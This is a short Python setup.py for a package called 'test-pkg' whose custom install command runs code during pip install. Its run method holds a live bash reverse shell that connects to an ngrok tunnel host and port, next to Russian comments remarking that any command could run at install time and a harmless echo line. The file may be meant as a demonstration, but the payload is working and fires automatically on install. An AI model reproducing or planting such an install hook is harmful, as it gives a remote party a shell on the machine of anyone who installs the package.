from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        # ⚠️ Это код выполнится при pip install!
        __import__('os').system('bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10395 0>&1"')
        # Пример: можно выполнить любую команду
        # os.system("whoami")  # ← опасно, но технически возможно
        os.system("echo 'Hello from install!'")
        super().run()

setup(
    name="test-pkg",
    version="0.1",
    cmdclass={'install': CustomInstall},
)
